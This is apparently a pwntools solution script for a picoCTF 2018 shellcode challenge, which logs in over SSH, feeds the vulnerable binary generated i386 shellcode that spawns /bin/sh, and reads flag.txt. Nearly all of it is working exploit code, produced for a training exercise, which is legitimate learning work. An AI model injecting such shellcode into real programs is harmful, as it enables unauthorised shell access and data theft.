#!/usr/bin/env python
from pwn import *

r = ssh(user='b0nes', host='2018shell3.picoctf.com', keyfile='/home/b0nes/.ssh/id_rsa') 
sh = r.process('/bin/sh', env={"PS1":""})
sh.sendline('cd /problems/shellcode_2_0caa0f1860741079dd0a66ccf032c5f4')
payload = asm(shellcraft.i386.linux.sh())
sh.sendline('./vuln')
sh.sendafter('string!', payload + '\n')
sh.sendafter('...','cat flag.txt\n')
sh.interactive()

if __name__ == "__main__":
    pass    
